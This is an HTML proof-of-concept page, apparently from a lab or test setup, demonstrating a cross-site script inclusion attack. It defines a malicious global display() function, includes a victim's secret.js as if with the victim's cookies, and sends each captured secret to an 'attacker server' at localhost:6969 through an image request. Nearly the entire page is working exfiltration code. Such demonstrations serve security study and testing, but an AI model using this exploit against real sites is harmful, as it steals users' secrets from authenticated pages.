<!DOCTYPE html>
<html>
<head>
    <title>XSS Include Exploit Test</title>
</head>
<body>
    <h1>XSS Include Vulnerability Demonstration</h1>
    <p>This page demonstrates how an attacker can steal secrets via JavaScript include.</p>
    
    <h2>Step 1: Override the display function</h2>
    <script>
        console.log("Setting up malicious display function...");
        
        // Malicious display function that exfiltrates data
        function display(title, content) {
            console.log("Stolen secret:", title, ":", content);
            
            // Send stolen data to attacker server
            var img = new Image();
            img.src = "http://localhost:6969/leak?secret=" + encodeURIComponent(title + ": " + content);
            document.body.appendChild(img);
            
            // Also display visibly for demonstration
            var div = document.createElement('div');
            div.innerHTML = "<strong>STOLEN:</strong> " + title + " = " + content;
            div.style = "background: red; color: white; padding: 10px; margin: 5px; border: 1px solid black;";
            document.getElementById('stolen-secrets').appendChild(div);
        }
    </script>
    
    <h2>Step 2: Include victim's secret.js (with victim's cookies)</h2>
    <div id="stolen-secrets"></div>
    
    <!-- This would normally be loaded with the victim's session cookies -->
    <script src="http://localhost:9041/secret.js"></script>
    
    <h2>Exploitation Status</h2>
    <p>Check the browser's network tab to see requests to the attacker server with stolen secrets.</p>
</body>
</html>